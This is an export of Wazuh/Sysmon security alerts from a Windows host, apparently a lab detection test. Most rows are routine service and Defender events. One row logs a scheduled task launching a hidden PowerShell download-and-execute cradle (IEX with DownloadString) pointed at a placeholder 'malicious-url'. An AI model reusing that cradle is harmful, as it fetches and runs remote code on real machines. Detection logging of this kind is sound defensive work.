_index,_id,_version,_score,_source.agent.ip,_source.agent.name,_source.agent.id,_source.manager.name,_source.data.win.eventdata.originalFileName,_source.data.win.eventdata.image,_source.data.win.eventdata.product,_source.data.win.eventdata.parentProcessGuid,_source.data.win.eventdata.description,_source.data.win.eventdata.logonGuid,_source.data.win.eventdata.parentCommandLine,_source.data.win.eventdata.processGuid,_source.data.win.eventdata.logonId,_source.data.win.eventdata.parentProcessId,_source.data.win.eventdata.processId,_source.data.win.eventdata.currentDirectory,_source.data.win.eventdata.utcTime,_source.data.win.eventdata.hashes,_source.data.win.eventdata.parentImage,_source.data.win.eventdata.company,_source.data.win.eventdata.commandLine,_source.data.win.eventdata.integrityLevel,_source.data.win.eventdata.fileVersion,_source.data.win.eventdata.user,_source.data.win.eventdata.terminalSessionId,_source.data.win.eventdata.parentUser,_source.data.win.system.eventID,_source.data.win.system.keywords,_source.data.win.system.providerGuid,_source.data.win.system.level,_source.data.win.system.channel,_source.data.win.system.opcode,_source.data.win.system.message,_source.data.win.system.version,_source.data.win.system.systemTime,_source.data.win.system.eventRecordID,_source.data.win.system.threadID,_source.data.win.system.computer,_source.data.win.system.task,_source.data.win.system.processID,_source.data.win.system.severityValue,_source.data.win.system.providerName,_source.rule.firedtimes,_source.rule.mail,_source.rule.level,_source.rule.description,_source.rule.groups,_source.rule.id,_source.decoder.name,_source.full_log,_source.input.type,_source.@timestamp,_source.location,_source.id,_source.timestamp,_source.data.win.eventdata.targetFilename,_source.data.win.eventdata.creationUtcTime,_source.rule.mitre.technique,_source.rule.mitre.id,_source.rule.mitre.tactic,_source.data.win.eventdata.subjectLogonId,_source.data.win.eventdata.subjectDomainName,_source.data.win.eventdata.targetLinkedLogonId,_source.data.win.eventdata.impersonationLevel,_source.data.win.eventdata.authenticationPackageName,_source.data.win.eventdata.targetLogonId,_source.data.win.eventdata.logonProcessName,_source.data.win.eventdata.targetUserName,_source.data.win.eventdata.keyLength,_source.data.win.eventdata.elevatedToken,_source.data.win.eventdata.subjectUserSid,_source.data.win.eventdata.processName,_source.data.win.eventdata.targetDomainName,_source.data.win.eventdata.targetUserSid,_source.data.win.eventdata.virtualAccount,_source.data.win.eventdata.logonType,_source.data.win.eventdata.subjectUserName,_source.rule.pci_dss,_source.rule.hipaa,_source.rule.tsc,_source.rule.nist_800_53,_source.rule.gdpr,_source.rule.gpg13,_source.data.win.eventdata.destinationPort,_source.data.win.eventdata.sourcePort,_source.data.win.eventdata.initiated,_source.data.win.eventdata.destinationIp,_source.data.win.eventdata.protocol,_source.data.win.eventdata.sourceIp,_source.data.win.eventdata.sourceHostname,_source.data.win.eventdata.destinationPortName,_source.data.win.eventdata.destinationIsIpv6,_source.data.win.eventdata.sourceIsIpv6,_source.predecoder.hostname,_source.predecoder.program_name,_source.predecoder.timestamp,_source.data.srcuser,_source.data.dstuser,_source.data.tty,_source.data.pwd,_source.data.command,_source.decoder.parent,_source.decoder.ftscomment,_source.data.win.eventdata.queryStatus,_source.data.win.eventdata.queryName,_source.data.win.eventdata.queryResults,_source.data.win.eventdata.targetObject,_source.data.win.eventdata.ruleName,_source.data.win.eventdata.details,_source.data.win.eventdata.eventType,_source.data.uid,_source.data.win.eventdata.privilegeList,_source.data.extra_data,_source.data.status,_source.data.win.eventdata.data,_source.data.win.system.eventSourceName,_source.data.win.eventdata.destinationHostname,_source.data.win.eventdata.ipPort,_source.data.win.eventdata.failureReason,_source.data.win.eventdata.ipAddress,_source.data.win.eventdata.subStatus,_source.data.win.eventdata.status,_source.data.win.eventdata.hResult,_source.data.win.eventdata.extraInfo,_source.data.win.eventdata.binary,_source.data.win.eventdata.addressLength,_source.data.win.eventdata.address,_source.data.win.eventdata.clientProcessId,_source.data.win.eventdata.taskContent,_source.data.win.eventdata.rpcCallClientLocality,_source.data.win.eventdata.clientProcessStartKey,_source.data.win.eventdata.taskName,_source.data.win.eventdata.fQDN,_source.data.title,_source.data.win.eventdata.workstationName,_source.data.win.eventdata.param3,_source.data.win.eventdata.param4,_source.data.win.eventdata.param1,_source.data.win.eventdata.param2,_source.rule.info
wazuh-alerts-4.x-2025.06.09,AOALVZcBD7y1GXNGlYgO,1,1,192.168.254.162,DESKTOP-O7P9I53,001,hat-VMware-Virtual-Platform,PowerShell.EXE,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,Microsoft® Windows® Operating System,{154c2aaf-e982-6846-1900-000000001800},Windows PowerShell,{154c2aaf-ea73-6846-23bd-220000000000},C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule,{154c2aaf-ec64-6846-f601-000000001800},0x22bd23,1168,2448,C:\\Windows\\system32\\,2025-06-09 14:15:00.027,"MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6",C:\\Windows\\System32\\svchost.exe,Microsoft Corporation,"\""powershell.exe\"" -nop -w hidden -c IEX(New-Object  Net.WebClient).DownloadString(\""http://malicious-url\"")",Medium,10.0.19041.3996 (WinBuild.160101.0800),DESKTOP-O7P9I53\\admin,1,NT AUTHORITY\\SYSTEM,1,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: -
UtcTime: 2025-06-09 14:15:00.027
ProcessGuid: {154c2aaf-ec64-6846-f601-000000001800}
ProcessId: 2448
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.19041.3996 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" -nop -w hidden -c IEX(New-Object 
Net.WebClient).DownloadString(""http://malicious-url"")
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-O7P9I53\admin
LogonGuid: {154c2aaf-ea73-6846-23bd-220000000000}
LogonId: 0x22BD23
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6
ParentProcessGuid: {154c2aaf-e982-6846-1900-000000001800}
ParentProcessId: 1168
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule
ParentUser: NT AUTHORITY\SYSTEM""",5,2025-06-09T14:15:00.0303456Z,31626,5512,DESKTOP-O7P9I53,1,3292,INFORMATION,Microsoft-Windows-Sysmon,114,false,5,Sysmon - Event 1: Process creation Windows PowerShell,"[""windows"",""sysmon"",""sysmon_event1""]",61603,windows_eventchannel,"{""win"":{""system"":{""providerName"":""Microsoft-Windows-Sysmon"",""providerGuid"":""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"",""eventID"":""1"",""version"":""5"",""level"":""4"",""task"":""1"",""opcode"":""0"",""keywords"":""0x8000000000000000"",""systemTime"":""2025-06-09T14:15:00.0303456Z"",""eventRecordID"":""31626"",""processID"":""3292"",""threadID"":""5512"",""channel"":""Microsoft-Windows-Sysmon/Operational"",""computer"":""DESKTOP-O7P9I53"",""severityValue"":""INFORMATION"",""message"":""\""Process Create:\r\nRuleName: -\r\nUtcTime: 2025-06-09 14:15:00.027\r\nProcessGuid: {154c2aaf-ec64-6846-f601-000000001800}\r\nProcessId: 2448\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nFileVersion: 10.0.19041.3996 (WinBuild.160101.0800)\r\nDescription: Windows PowerShell\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: PowerShell.EXE\r\nCommandLine: \""powershell.exe\"" -nop -w hidden -c IEX(New-Object \nNet.WebClient).DownloadString(\""http://malicious-url\"")\r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: DESKTOP-O7P9I53\\admin\r\nLogonGuid: {154c2aaf-ea73-6846-23bd-220000000000}\r\nLogonId: 0x22BD23\r\nTerminalSessionId: 1\r\nIntegrityLevel: Medium\r\nHashes: MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6\r\nParentProcessGuid: {154c2aaf-e982-6846-1900-000000001800}\r\nParentProcessId: 1168\r\nParentImage: C:\\Windows\\System32\\svchost.exe\r\nParentCommandLine: C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule\r\nParentUser: NT AUTHORITY\\SYSTEM\""""},""eventdata"":{""utcTime"":""2025-06-09 14:15:00.027"",""processGuid"":""{154c2aaf-ec64-6846-f601-000000001800}"",""processId"":""2448"",""image"":""C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"",""fileVersion"":""10.0.19041.3996 (WinBuild.160101.0800)"",""description"":""Windows PowerShell"",""product"":""Microsoft® Windows® Operating System"",""company"":""Microsoft Corporation"",""originalFileName"":""PowerShell.EXE"",""commandLine"":""\\\""powershell.exe\\\"" -nop -w hidden -c IEX(New-Object  Net.WebClient).DownloadString(\\\""http://malicious-url\\\"")"",""currentDirectory"":""C:\\\\Windows\\\\system32\\\\"",""user"":""DESKTOP-O7P9I53\\\\admin"",""logonGuid"":""{154c2aaf-ea73-6846-23bd-220000000000}"",""logonId"":""0x22bd23"",""terminalSessionId"":""1"",""integrityLevel"":""Medium"",""hashes"":""MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6"",""parentProcessGuid"":""{154c2aaf-e982-6846-1900-000000001800}"",""parentProcessId"":""1168"",""parentImage"":""C:\\\\Windows\\\\System32\\\\svchost.exe"",""parentCommandLine"":""C:\\\\Windows\\\\system32\\\\svchost.exe -k netsvcs -p -s Schedule"",""parentUser"":""NT AUTHORITY\\\\SYSTEM""}}}",log,"Jun 9, 2025 @ 19:45:01.349",EventChannel,1749478501.3611187,"Jun 9, 2025 @ 19:45:01.349", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2025.06.09,_OAKVZcBD7y1GXNGlofx,1,1,192.168.254.162,DESKTOP-O7P9I53,001,hat-VMware-Virtual-Platform, ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , ,{154c2aaf-ec29-6846-f401-000000001800}, , ,8852, ,2025-06-09 14:14:01.166, , , , , , ,DESKTOP-O7P9I53\\admin, , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: -
UtcTime: 2025-06-09 14:14:01.166
ProcessGuid: {154c2aaf-ec29-6846-f401-000000001800}
ProcessId: 8852
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\admin\AppData\Local\Temp\__PSScriptPolicyTest_efking3g.5te.ps1
CreationUtcTime: 2025-06-09 14:14:01.166
User: DESKTOP-O7P9I53\admin""",2,2025-06-09T14:14:01.1762720Z,31625,5512,DESKTOP-O7P9I53,11,3292,INFORMATION,Microsoft-Windows-Sysmon,8,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213,windows_eventchannel, ,log,"Jun 9, 2025 @ 19:44:02.320",EventChannel,1749478442.3608399,"Jun 9, 2025 @ 19:44:02.320",C:\\Users\\admin\\AppData\\Local\\Temp\\__PSScriptPolicyTest_efking3g.5te.ps1,2025-06-09 14:14:01.166,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2025.06.09,9uAJVZcBD7y1GXNGkYc1,1,1,192.168.254.162,DESKTOP-O7P9I53,001,hat-VMware-Virtual-Platform,MpCmdRun.exe,C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.25040.2-0\\MpCmdRun.exe,Microsoft® Windows® Operating System,{154c2aaf-e984-6846-5800-000000001800},Microsoft Malware Protection Command Line Utility,{154c2aaf-e981-6846-e703-000000000000},"\""C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.25040.2-0\\MsMpEng.exe\""",{154c2aaf-ebe8-6846-e401-000000001800},0x3e7,3528,1724,C:\\Windows\\system32\\,2025-06-09 14:12:56.557,"MD5=638CF1EBFCE496EAB4F6BED4351FCBD4,SHA256=BF06AA61402DF875CD38613CABFCC0134FA1E6B87AF45C3E806202E77DD1DC08,IMPHASH=7673DB246D5BA69E5322B0C1A609CB97",C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.25040.2-0\\MsMpEng.exe,Microsoft Corporation,"\""C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.25040.2-0\\MpCmdRun.exe\"" SignatureUpdate -ScheduleJob -RestrictPrivileges",System,4.18.25040.2 (82640e7cfde5ee75f6010c8d2c06272146d2bb6b),NT AUTHORITY\\SYSTEM,0,NT AUTHORITY\\SYSTEM,1,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: -
UtcTime: 2025-06-09 14:12:56.557
ProcessGuid: {154c2aaf-ebe8-6846-e401-000000001800}
ProcessId: 1724
Image: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25040.2-0\MpCmdRun.exe
FileVersion: 4.18.25040.2 (82640e7cfde5ee75f6010c8d2c06272146d2bb6b)
Description: Microsoft Malware Protection Command Line Utility
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: MpCmdRun.exe
CommandLine: ""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25040.2-0\MpCmdRun.exe"" SignatureUpdate -ScheduleJob -RestrictPrivileges
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {154c2aaf-e981-6846-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=638CF1EBFCE496EAB4F6BED4351FCBD4,SHA256=BF06AA61402DF875CD38613CABFCC0134FA1E6B87AF45C3E806202E77DD1DC08,IMPHASH=7673DB246D5BA69E5322B0C1A609CB97
ParentProcessGuid: {154c2aaf-e984-6846-5800-000000001800}
ParentProcessId: 3528
ParentImage: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25040.2-0\MsMpEng.exe
ParentCommandLine: ""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25040.2-0\MsMpEng.exe""
ParentUser: NT AUTHORITY\SYSTEM""",5,2025-06-09T14:12:56.5608986Z,31620,5512,DESKTOP-O7P9I53,1,3292,INFORMATION,Microsoft-Windows-Sysmon,110,false,5,Sysmon - Event 1: Process creation Microsoft Malware Protection Command Line Utility,"[""windows"",""sysmon"",""sysmon_event1""]",61603,windows_eventchannel,"{""win"":{""system"":{""providerName"":""Microsoft-Windows-Sysmon"",""providerGuid"":""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"",""eventID"":""1"",""version"":""5"",""level"":""4"",""task"":""1"",""opcode"":""0"",""keywords"":""0x8000000000000000"",""systemTime"":""2025-06-09T14:12:56.5608986Z"",""eventRecordID"":""31620"",""processID"":""3292"",""threadID"":""5512"",""channel"":""Microsoft-Windows-Sysmon/Operational"",""computer"":""DESKTOP-O7P9I53"",""severityValue"":""INFORMATION"",""message"":""\""Process Create:\r\nRuleName: -\r\nUtcTime: 2025-06-09 14:12:56.557\r\nProcessGuid: {154c2aaf-ebe8-6846-e401-000000001800}\r\nProcessId: 1724\r\nImage: C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.25040.2-0\\MpCmdRun.exe\r\nFileVersion: 4.18.25040.2 (82640e7cfde5ee75f6010c8d2c06272146d2bb6b)\r\nDescription: Microsoft Malware Protection Command Line Utility\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: MpCmdRun.exe\r\nCommandLine: \""C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.25040.2-0\\MpCmdRun.exe\"" SignatureUpdate -ScheduleJob -RestrictPrivileges\r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: NT AUTHORITY\\SYSTEM\r\nLogonGuid: {154c2aaf-e981-6846-e703-000000000000}\r\nLogonId: 0x3E7\r\nTerminalSessionId: 0\r\nIntegrityLevel: System\r\nHashes: MD5=638CF1EBFCE496EAB4F6BED4351FCBD4,SHA256=BF06AA61402DF875CD38613CABFCC0134FA1E6B87AF45C3E806202E77DD1DC08,IMPHASH=7673DB246D5BA69E5322B0C1A609CB97\r\nParentProcessGuid: {154c2aaf-e984-6846-5800-000000001800}\r\nParentProcessId: 3528\r\nParentImage: C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.25040.2-0\\MsMpEng.exe\r\nParentCommandLine: \""C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.25040.2-0\\MsMpEng.exe\""\r\nParentUser: NT AUTHORITY\\SYSTEM\""""},""eventdata"":{""utcTime"":""2025-06-09 14:12:56.557"",""processGuid"":""{154c2aaf-ebe8-6846-e401-000000001800}"",""processId"":""1724"",""image"":""C:\\\\ProgramData\\\\Microsoft\\\\Windows Defender\\\\Platform\\\\4.18.25040.2-0\\\\MpCmdRun.exe"",""fileVersion"":""4.18.25040.2 (82640e7cfde5ee75f6010c8d2c06272146d2bb6b)"",""description"":""Microsoft Malware Protection Command Line Utility"",""product"":""Microsoft® Windows® Operating System"",""company"":""Microsoft Corporation"",""originalFileName"":""MpCmdRun.exe"",""commandLine"":""\\\""C:\\\\ProgramData\\\\Microsoft\\\\Windows Defender\\\\Platform\\\\4.18.25040.2-0\\\\MpCmdRun.exe\\\"" SignatureUpdate -ScheduleJob -RestrictPrivileges"",""currentDirectory"":""C:\\\\Windows\\\\system32\\\\"",""user"":""NT AUTHORITY\\\\SYSTEM"",""logonGuid"":""{154c2aaf-e981-6846-e703-000000000000}"",""logonId"":""0x3e7"",""terminalSessionId"":""0"",""integrityLevel"":""System"",""hashes"":""MD5=638CF1EBFCE496EAB4F6BED4351FCBD4,SHA256=BF06AA61402DF875CD38613CABFCC0134FA1E6B87AF45C3E806202E77DD1DC08,IMPHASH=7673DB246D5BA69E5322B0C1A609CB97"",""parentProcessGuid"":""{154c2aaf-e984-6846-5800-000000001800}"",""parentProcessId"":""3528"",""parentImage"":""C:\\\\ProgramData\\\\Microsoft\\\\Windows Defender\\\\Platform\\\\4.18.25040.2-0\\\\MsMpEng.exe"",""parentCommandLine"":""\\\""C:\\\\ProgramData\\\\Microsoft\\\\Windows Defender\\\\Platform\\\\4.18.25040.2-0\\\\MsMpEng.exe\\\"""",""parentUser"":""NT AUTHORITY\\\\SYSTEM""}}}",log,"Jun 9, 2025 @ 19:42:57.850",EventChannel,1749478377.3578430,"Jun 9, 2025 @ 19:42:57.850", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2025.06.09,auADVZcBD7y1GXNG2YWP,1,1,192.168.254.162,DESKTOP-O7P9I53,001,hat-VMware-Virtual-Platform,sc.exe,C:\\Windows\\System32\\sc.exe,Microsoft® Windows® Operating System,{154c2aaf-e982-6846-1900-000000001800},Service Control Manager Configuration Tool,{154c2aaf-e981-6846-e703-000000000000},C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule,{154c2aaf-ea36-6846-2901-000000001800},0x3e7,1168,2860,C:\\Windows\\system32\\,2025-06-09 14:05:42.856,"MD5=3FB5CF71F7E7EB49790CB0E663434D80,SHA256=41F067C3A11B02FE39947F9EBA68AE5C7CB5BD1872A6009A4CD1506554A9ABA9,IMPHASH=803254E010814E69947095A2725B2AFD",C:\\Windows\\System32\\svchost.exe,Microsoft Corporation,"\""C:\\Windows\\system32\\sc.exe\"" start wuauserv",System,10.0.19041.1 (WinBuild.160101.0800),NT AUTHORITY\\SYSTEM,0,NT AUTHORITY\\SYSTEM,1,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: -
UtcTime: 2025-06-09 14:05:42.856
ProcessGuid: {154c2aaf-ea36-6846-2901-000000001800}
ProcessId: 2860
Image: C:\Windows\System32\sc.exe
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
Description: Service Control Manager Configuration Tool
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: sc.exe
CommandLine: ""C:\Windows\system32\sc.exe"" start wuauserv
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {154c2aaf-e981-6846-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=3FB5CF71F7E7EB49790CB0E663434D80,SHA256=41F067C3A11B02FE39947F9EBA68AE5C7CB5BD1872A6009A4CD1506554A9ABA9,IMPHASH=803254E010814E69947095A2725B2AFD
ParentProcessGuid: {154c2aaf-e982-6846-1900-000000001800}
ParentProcessId: 1168
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule
ParentUser: NT AUTHORITY\SYSTEM""",5,2025-06-09T14:05:42.8798853Z,30721,5512,DESKTOP-O7P9I53,1,3292,INFORMATION,Microsoft-Windows-Sysmon,7,false,5,Sysmon - Event 1: Process creation Service Control Manager Configuration Tool,"[""windows"",""sysmon"",""sysmon_event1""]",61603,windows_eventchannel,"{""win"":{""system"":{""providerName"":""Microsoft-Windows-Sysmon"",""providerGuid"":""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"",""eventID"":""1"",""version"":""5"",""level"":""4"",""task"":""1"",""opcode"":""0"",""keywords"":""0x8000000000000000"",""systemTime"":""2025-06-09T14:05:42.8798853Z"",""eventRecordID"":""30721"",""processID"":""3292"",""threadID"":""5512"",""channel"":""Microsoft-Windows-Sysmon/Operational"",""computer"":""DESKTOP-O7P9I53"",""severityValue"":""INFORMATION"",""message"":""\""Process Create:\r\nRuleName: -\r\nUtcTime: 2025-06-09 14:05:42.856\r\nProcessGuid: {154c2aaf-ea36-6846-2901-000000001800}\r\nProcessId: 2860\r\nImage: C:\\Windows\\System32\\sc.exe\r\nFileVersion: 10.0.19041.1 (WinBuild.160101.0800)\r\nDescription: Service Control Manager Configuration Tool\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: sc.exe\r\nCommandLine: \""C:\\Windows\\system32\\sc.exe\"" start wuauserv\r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: NT AUTHORITY\\SYSTEM\r\nLogonGuid: {154c2aaf-e981-6846-e703-000000000000}\r\nLogonId: 0x3E7\r\nTerminalSessionId: 0\r\nIntegrityLevel: System\r\nHashes: MD5=3FB5CF71F7E7EB49790CB0E663434D80,SHA256=41F067C3A11B02FE39947F9EBA68AE5C7CB5BD1872A6009A4CD1506554A9ABA9,IMPHASH=803254E010814E69947095A2725B2AFD\r\nParentProcessGuid: {154c2aaf-e982-6846-1900-000000001800}\r\nParentProcessId: 1168\r\nParentImage: C:\\Windows\\System32\\svchost.exe\r\nParentCommandLine: C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule\r\nParentUser: NT AUTHORITY\\SYSTEM\""""},""eventdata"":{""utcTime"":""2025-06-09 14:05:42.856"",""processGuid"":""{154c2aaf-ea36-6846-2901-000000001800}"",""processId"":""2860"",""image"":""C:\\\\Windows\\\\System32\\\\sc.exe"",""fileVersion"":""10.0.19041.1 (WinBuild.160101.0800)"",""description"":""Service Control Manager Configuration Tool"",""product"":""Microsoft® Windows® Operating System"",""company"":""Microsoft Corporation"",""originalFileName"":""sc.exe"",""commandLine"":""\\\""C:\\\\Windows\\\\system32\\\\sc.exe\\\"" start wuauserv"",""currentDirectory"":""C:\\\\Windows\\\\system32\\\\"",""user"":""NT AUTHORITY\\\\SYSTEM"",""logonGuid"":""{154c2aaf-e981-6846-e703-000000000000}"",""logonId"":""0x3e7"",""terminalSessionId"":""0"",""integrityLevel"":""System"",""hashes"":""MD5=3FB5CF71F7E7EB49790CB0E663434D80,SHA256=41F067C3A11B02FE39947F9EBA68AE5C7CB5BD1872A6009A4CD1506554A9ABA9,IMPHASH=803254E010814E69947095A2725B2AFD"",""parentProcessGuid"":""{154c2aaf-e982-6846-1900-000000001800}"",""parentProcessId"":""1168"",""parentImage"":""C:\\\\Windows\\\\System32\\\\svchost.exe"",""parentCommandLine"":""C:\\\\Windows\\\\system32\\\\svchost.exe -k netsvcs -p -s Schedule"",""parentUser"":""NT AUTHORITY\\\\SYSTEM""}}}",log,"Jun 9, 2025 @ 19:35:44.252",EventChannel,1749477944.1014686,"Jun 9, 2025 @ 19:35:44.252", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2025.06.09,buADVZcBD7y1GXNG2YWP,1,1,192.168.254.162,DESKTOP-O7P9I53,001,hat-VMware-Virtual-Platform,sc.exe,C:\\Windows\\System32\\sc.exe,Microsoft® Windows® Operating System,{154c2aaf-e982-6846-1900-000000001800},Service Control Manager Configuration Tool,{154c2aaf-e981-6846-e703-000000000000},C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule,{154c2aaf-ea36-6846-2b01-000000001800},0x3e7,1168,3028,C:\\Windows\\system32\\,2025-06-09 14:05:42.862,"MD5=3FB5CF71F7E7EB49790CB0E663434D80,SHA256=41F067C3A11B02FE39947F9EBA68AE5C7CB5BD1872A6009A4CD1506554A9ABA9,IMPHASH=803254E010814E69947095A2725B2AFD",C:\\Windows\\System32\\svchost.exe,Microsoft Corporation,"\""C:\\Windows\\system32\\sc.exe\"" start pushtoinstall registration",System,10.0.19041.1 (WinBuild.160101.0800),NT AUTHORITY\\SYSTEM,0,NT AUTHORITY\\SYSTEM,1,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: -
UtcTime: 2025-06-09 14:05:42.862
ProcessGuid: {154c2aaf-ea36-6846-2b01-000000001800}
ProcessId: 3028
Image: C:\Windows\System32\sc.exe
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
Description: Service Control Manager Configuration Tool
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: sc.exe
CommandLine: ""C:\Windows\system32\sc.exe"" start pushtoinstall registration
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {154c2aaf-e981-6846-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=3FB5CF71F7E7EB49790CB0E663434D80,SHA256=41F067C3A11B02FE39947F9EBA68AE5C7CB5BD1872A6009A4CD1506554A9ABA9,IMPHASH=803254E010814E69947095A2725B2AFD
ParentProcessGuid: {154c2aaf-e982-6846-1900-000000001800}
ParentProcessId: 1168
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule
ParentUser: NT AUTHORITY\SYSTEM""",5,2025-06-09T14:05:42.8979757Z,30725,5512,DESKTOP-O7P9I53,1,3292,INFORMATION,Microsoft-Windows-Sysmon,11,false,5,Sysmon - Event 1: Process creation Service Control Manager Configuration Tool,"[""windows"",""sysmon"",""sysmon_event1""]",61603,windows_eventchannel,"{""win"":{""system"":{""providerName"":""Microsoft-Windows-Sysmon"",""providerGuid"":""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"",""eventID"":""1"",""version"":""5"",""level"":""4"",""task"":""1"",""opcode"":""0"",""keywords"":""0x8000000000000000"",""systemTime"":""2025-06-09T14:05:42.8979757Z"",""eventRecordID"":""30725"",""processID"":""3292"",""threadID"":""5512"",""channel"":""Microsoft-Windows-Sysmon/Operational"",""computer"":""DESKTOP-O7P9I53"",""severityValue"":""INFORMATION"",""message"":""\""Process Create:\r\nRuleName: -\r\nUtcTime: 2025-06-09 14:05:42.862\r\nProcessGuid: {154c2aaf-ea36-6846-2b01-000000001800}\r\nProcessId: 3028\r\nImage: C:\\Windows\\System32\\sc.exe\r\nFileVersion: 10.0.19041.1 (WinBuild.160101.0800)\r\nDescription: Service Control Manager Configuration Tool\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: sc.exe\r\nCommandLine: \""C:\\Windows\\system32\\sc.exe\"" start pushtoinstall registration\r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: NT AUTHORITY\\SYSTEM\r\nLogonGuid: {154c2aaf-e981-6846-e703-000000000000}\r\nLogonId: 0x3E7\r\nTerminalSessionId: 0\r\nIntegrityLevel: System\r\nHashes: 